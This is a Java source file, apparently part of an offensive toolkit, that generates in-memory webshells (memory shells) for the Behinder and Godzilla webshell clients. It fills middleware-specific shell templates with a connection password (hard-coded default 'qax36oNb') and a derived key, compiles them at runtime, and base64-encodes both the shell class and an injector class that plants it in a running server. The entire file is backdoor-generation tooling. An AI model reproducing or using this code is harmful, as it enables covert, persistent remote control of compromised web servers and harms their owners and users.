package com.droplab.Utils.Memory;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.compile.JavaStringCompiler;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

import java.util.Map;

public class MemroyFactory {
    private static MemroyFactory memroyFactory = null;

    public static MemroyFactory instance() {
        if (memroyFactory != null) {

        } else {
            memroyFactory = new MemroyFactory();
        }
        return memroyFactory;
    }

    public String getMemoryShell(String type, String middleware, String password, String shellType, String path, boolean template, String addStrName) {
        try {
            String ImplStr = String.format("com.droplab.Utils.Memory.%s.%s.%sImplStr", type, middleware, middleware);
            String addStr = String.format("com.droplab.Utils.Memory.%s.%s.add%s", type, middleware, middleware);

            JavaStringCompiler javaStringCompiler = new JavaStringCompiler();

            /*生成连接密码*/
            if (password.equals("") || password.isEmpty() || password == null) {
                password = "qax36oNb";
            }
            String md5 = CommonUtils.getMD5(password);
            String behinder = md5.substring(0, 16); //冰蝎密码

            /**
             * 生成内存马类
             *
             */
            String implStrName = CommonUtils.RandomStr(6);
            Object o = Class.forName(ImplStr).newInstance();
            String implStr = (String) o.getClass().getMethod("get", Object.class, String.class, boolean.class).invoke(o, o, shellType, template);
            String format = "";
            if (shellType.equals("Behinder")) {
                format = String.format(implStr, implStrName, implStrName, behinder);
            } else if (shellType.equals("Godzilla")) {
                format = String.format(implStr, implStrName, implStrName, password, CommonUtils.getMD5(password + "2f2e9f40c6d9fa47"));
            }
            Map<String, byte[]> compile = javaStringCompiler.compile(implStrName + ".java", format);
            byte[] bytes = compile.get(implStrName);
            String s = new BASE64Encoder().encode(bytes).replaceAll("\r\n","");
            /**
             * 生成注入内存马的类
             */
            if (addStrName.equals("") || addStrName == null) {
                addStrName = CommonUtils.RandomStr(6);
            }
            Object o1 = Class.forName(addStr).newInstance();
            String addStrType = (String) o1.getClass().getMethod("get", Object.class, String.class, boolean.class).invoke(o1, o1, type, template);
            String format1 = String.format(addStrType, addStrName, addStrName, s);
            Map<String, byte[]> compile1 = javaStringCompiler.compile(addStrName + ".java", format1);
            byte[] bytes1 = compile1.get(addStrName);
            //new BASE64Decoder().decodeBuffer();
            return new BASE64Encoder().encode(bytes1);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void main(String[] args) {
    }

}

